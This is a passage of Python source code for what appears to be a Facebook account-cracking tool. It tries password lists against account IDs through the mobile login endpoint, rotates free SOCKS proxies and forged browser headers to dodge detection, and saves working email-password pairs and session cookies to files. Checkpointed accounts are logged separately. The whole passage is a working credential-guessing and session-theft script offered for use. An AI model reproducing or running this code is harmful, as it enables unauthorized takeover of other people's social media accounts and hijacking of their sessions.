'fbconnect://cct.com.storymatrix.drama?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%220_auth_logger_id%22%3A%2259c73c85-c5d0-4b9c-b2c6-323952eb4601%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22j5t5t0o4lccb5iq9qvd3%22%7D','lwv': '100',}
      po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=629274312371363&auth_token=814eea949fabcef2ea98e625e85fca7f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D629274312371363%26cbt%3D1717747637996%26e2e%3D%257B%2522init%2522%253A1717747637996%257D%26ies%3D1%26sdk%3Dandroid-13.0.0%26sso%3Dchrome_custom_tab%26nonce%3Dea9a9761-d2e0-4cde-83d7-78d3d7116502%26scope%3Dpublic_profile%252Cemail%252Copenid%26state%3D%257B%25220_auth_logger_id%2522%253A%252259c73c85-c5d0-4b9c-b2c6-323952eb4601%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j5t5t0o4lccb5iq9qvd3%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.storymatrix.drama%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D9VpwzgSW1GDZHkN4P1L8pZAnzjBeKxwjGs8UokpZ_Ms%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D59c73c85-c5d0-4b9c-b2c6-323952eb4601%26tp%3Dunspecified&refsrc=deprecated&app_id=629274312371363&cancel=fbconnect%3A%2F%2Fcct.com.storymatrix.drama%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252259c73c85-c5d0-4b9c-b2c6-323952eb4601%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j5t5t0o4lccb5iq9qvd3%2522%257D&lwv=100 h2', params=params,data=date,headers=head,allow_redirects=False,proxies=proxs)
      if "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki = ses.cookies.get_dict()
        kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
        print(f'GMAIL : {hijo}{idf}{puti}')
        print(f'PW : {hijo}{pw}{puti}')
        print(f'COKI : {hijo}{kuki}{puti}')
        open('ZAXXY-OK/'+'ZAXXY-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
        open('ZAXXY-OK/'+'ZAXXY-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
        break	
      elif "checkpoint" in po.cookies.get_dict().keys():
        print(f'GMAIL : {mer}{idf}{puti}')
        print(f'PW : {mer}{pw}{puti}')
        print(f'UGEN : {mer}{ua}{puti}')
        open('ZAXXY-CP/'+'ZAXXY-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        akune.append(idf+'|'+pw)
        ceker(idf,pw)
        cp+=1
        break	
      else:
        continue
    except requests.exceptions.ConnectionError:time.sleep(31)
  loop+=1
#----------[ ASNYC2 ]----------#
def apicrack(idf,pwx,url):
  global loop,ok,cp
  ses = requests.Session()
  rr = random.randint
  rc = random.choice
  prog.update(des,description=f"{h}Asnyc{x} {loop}/{len(id)} OK-:[bold cyan]{ok}[/] CP-:[bold yellow]{cp}[/]")
  prog.advance(des)
  for pw in pwx:
    try:
      proxs = requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt').text
      open('http.txt','w').write(proxs)
      nip = rc(proxs)
      proxs = {'http': 'socks4://'+nip}
      ua = rc(ugen)
      ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
      link = ses.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=629274312371363&kid_directed_site=0&app_id=629274312371363&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D629274312371363%26cbt%3D1717747637996%26e2e%3D%257B%2522init%2522%253A1717747637996%257D%26ies%3D1%26sdk%3Dandroid-13.0.0%26sso%3Dchrome_custom_tab%26nonce%3Dea9a9761-d2e0-4cde-83d7-78d3d7116502%26scope%3Dpublic_profile%252Cemail%252Copenid%26state%3D%257B%25220_auth_logger_id%2522%253A%252259c73c85-c5d0-4b9c-b2c6-323952eb4601%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j5t5t0o4lccb5iq9qvd3%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.storymatrix.drama%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D9VpwzgSW1GDZHkN4P1L8pZAnzjBeKxwjGs8UokpZ_Ms%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D59c73c85-c5d0-4b9c-b2c6-323952eb4601%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.storymatrix.drama%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252259c73c85-c5d0-4b9c-b2c6-323952eb4601%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j5t5t0o4lccb5iq9qvd3%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
      date = {
      'jazoest': re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
      'lsd': re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
      'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
      'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
      'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
      'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
      'email': idf,
      'pass': pw,
      'login': 'Masuk',
      'bi_xrwh': '0',
        }
      head = {
      'Host': url,
      'content-length': '2171',
      'sec-ch-ua': 'Not-A.Brand;v=99, Chromium;v=124',
      'sec-ch-ua-mobile': '?1',
      'user-agent': ua,
      'content-type': 'application/x-www-form-urlencoded',
      'x-fb-lsd': 'AVo7ni49ePk',
      'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
      'x-asbd-id': '129477',
      'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(rr(8,24))}.0.0.0", "Chromium";v="{str(rr(99,120))}.0.{str(rr(5000,5999))}.{str(rr(40,150))}"',
      'sec-ch-ua-model': 'CPH1923',
      'sec-ch-prefers-color-scheme': 'dark',
      'sec-ch-ua-platform': 'Android',
      'accept': '*/*',
      'origin': f'https://'+url,
      'sec-fetch-site': 'same-origin',
      'sec-fetch-mode': 'cors',
      'sec-fetch-dest': 'empty',
      'referer': 'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=629274312371363&kid_directed_site=0&app_id=629274312371363&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D629274312371363%26cbt%3D1717747637996%26e2e%3D%257B%2522init%2522%253A1717747637996%257D%26ies%3D1%26sdk%3Dandroid-13.0.0%26sso%3Dchrome_custom_tab%26nonce%3Dea9a9761-d2e0-4cde-83d7-78d3d7116502%26scope%3Dpublic_profile%252Cemail%252Copenid%26state%3D%257B%25220_auth_logger_id%2522%253A%252259c73c85-c5d0-4b9c-b2c6-323952eb4601%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j5t5t0o4lccb5iq9qvd3%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.storymatrix.drama%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D9VpwzgSW1GDZHkN4P1L8pZAnzjBeKxwjGs8UokpZ_Ms%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D59c73c85-c5d0-4b9c-b2c6-323952eb4601%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.storymatrix.drama%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252259c73c85-c5d0-4b9c-b2c6-323952eb4601%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j5t5t0o4lccb5iq9qvd3%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
      'accept-encoding': 'gzip, deflate, br',
      'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
      params = {'api_key': '629274312371363','auth_token': '814eea949fabcef2ea98e625e85fca7f','skip_api_login': '1','signed_next': '1','next': 'https://m.facebook.com/v13.0/dialog/oauth?cct_prefetching=0&client_id=629274312371363&cbt=1717747637996&e2e=%7B%22init%22%3A1717747637996%7D&ies=1&sdk=android-13.0.0&sso=chrome_custom_tab&nonce=ea9a9761-d2e0-4cde-83d7-78d3d7116502&scope=public_profile%2Cemail%2Copenid&state=%7B%220_auth_logger_id%22%3A%2259c73c85-c5d0-4b9c-b2c6-323952eb4601%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22j5t5t0o4lccb5iq9qvd3%22%7D&code_challenge_method=S256&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.storymatrix.drama&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&code_challenge=9VpwzgSW1GDZHkN4P1L8pZAnzjBeKxwjGs8UokpZ_Ms&ret=login&fbapp_pres=0&logger_id=59c73c85-c5d0-4b9c-b2c6-323952eb4601&tp=unspecified','refsrc': 'deprecated','app_id': '629274312371363','cancel': 'fbconnect://cct.com.storymatrix.drama?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%220_auth_logger_id%22%3A%2259c73c85-c5d0-4b9c-b2c6-323952eb4601%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22j5t5t0o4lccb5iq9qvd3%22%7D','lwv': '100',}
      po = ses.post('https://m.prod.facebook.com/login/device-based/login/async/?api_key=629274312371363&auth_token=814eea949fabcef2ea98e625e85fca7f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D629274312371363%26cbt%3D1717747637996%26e2e%3D%257B%2522init%2522%253A1717747637996%257D%26ies%3D1%26sdk%3Dandroid-13.0.0%26sso%3Dchrome_custom_tab%26nonce%3Dea9a9761-d2e0-4cde-83d7-78d3d7116502%26scope%3Dpublic_profile%252Cemail%252Copenid%26state%3D%257B%25220_auth_logger_id%2522%253A%252259c73c85-c5d0-4b9c-b2c6-323952eb4601%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j5t5t0o4lccb5iq9qvd3%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.storymatrix.drama%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3D9VpwzgSW1GDZHkN4P1L8pZAnzjBeKxwjGs8UokpZ_Ms%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D59c73c85-c5d0-4b9c-b2c6-323952eb4601%26tp%3Dunspecified&refsrc=deprecated&app_id=629274312371363&cancel=fbconnect%3A%2F%2Fcct.com.storymatrix.drama%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252259c73c85-c5d0-4b9c-b2c6-323952eb4601%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j5t5t0o4lccb5iq9qvd3%2522%257D&lwv=100 h2', params=params,data=date,headers=head,allow_redirects=False,proxies=proxs)
      if "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki = ses.cookies.get_dict()
        kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
        print(f'GMAIL : {hijo}{idf}{puti}')
        print(f'PW : {hijo}{pw}{puti}')
        print(f'COKI : {hijo}{kuki}{puti}')
        open('ZAXXY-OK/'+'ZAXXY-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
        open('ZAXXY-OK/'+'ZAXXY-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
        break	
      elif "checkpoint" in po.cookies.get_dict().keys():
        print(f'GMAIL : {mer}{idf}{puti}')
        print(f'PW : {mer}{pw}{puti}')
        print(f'UGEN : {mer}{ua}{puti}')
        open('ZAXXY-CP/'+'ZAXXY-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        akune.append(idf+'|'+pw)
        ceker(idf,pw)
        cp+=1
        break	
      else:
        continue
    except requests.exceptions.ConnectionError:time.sleep(31)
  loop+=1		
#----------[ SYSTEM-KONTOL ]----------#	
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('ZAXXY-OK')
	except:pass
	try:os.mkdir('ZAXXY-CP')
	except:pass
	menu()
	
